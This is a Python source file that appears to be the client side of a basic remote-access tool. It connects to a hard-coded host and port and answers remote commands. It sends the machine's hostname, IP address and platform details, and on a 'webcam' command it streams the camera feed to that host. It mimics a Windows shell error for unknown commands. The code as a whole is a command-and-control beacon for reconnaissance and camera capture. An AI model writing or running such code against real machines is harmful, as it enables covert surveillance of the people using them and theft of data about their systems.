import platform
import time
import cv2
import io
import socket
import struct
import time
import pickle
import numpy as np
import imutils

host = '192.168.0.4'
port = 1515
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.connect((host, port))
host_name = socket.gethostname()
host_ip = socket.gethostbyname(host_name)
conn = server.makefile('wb')
sysinfo = {"HOSTNAME:":f"{host_name}","IP:":f"{host_ip}"}
while True:
    mess = server.recv((1024)).decode('utf-8')
    find = 1
    if mess  == "-hn":
        find = 0
        try:
            server.send(sysinfo["HOSTNAME:"].encode('utf-8'))

        except:
            server.send( "UNABLE TO FIND IP".encode('utf-8'))

    if mess == "-ip":
        find = 0
        try:
            server.send(sysinfo["IP:"].encode('utf-8'))

        except:
            server.send(sysinfo["IP:"] + "UNABLE TO FIND IP".encode('utf-8'))

    if mess == 'sysinfo':
        check = 0
        while check == 0:
            my_system = platform.uname()
            server.send(f"System: {my_system.system}".encode('utf-8'))
            server.send(f"Node Name: {my_system.node}".encode('utf-8'))
            server.send(f"Release: {my_system.release}".encode('utf-8'))
            server.send(f"Version: {my_system.version}".encode('utf-8'))
            server.send(f"Machine: {my_system.machine}".encode('utf-8'))
            server.send(f"Processor: {my_system.processor}".encode('utf-8'))
            check = 1
    if mess == "webcam":
        cam = cv2.VideoCapture(0)
        img_counter = 0

        # encode to jpeg format
        # encode param image quality 0 to 100. default:95
        # if you want to shrink data size, choose low image quality.
        encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]

        while True:
            ret, frame = cam.read()
            # 影像縮放
            frame = imutils.resize(frame, width=600,height=400)
            # 鏡像
            frame = cv2.flip(frame, 180)
            result, image = cv2.imencode('.jpg', frame, encode_param)
            data = pickle.dumps(image, 0)
            size = len(data)

            if img_counter % 10 == 0:
                server.sendall(struct.pack(">L", size) + data)
                cv2.imshow('client', frame)

            img_counter += 1

            # 若按下 q 鍵則離開迴圈
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break

        cam.release()



    elif find == 1:
        server.send(f"'{mess}'is not recognized as an internal or external command, operable program or batch file."
                    f"".encode('utf-8'))



















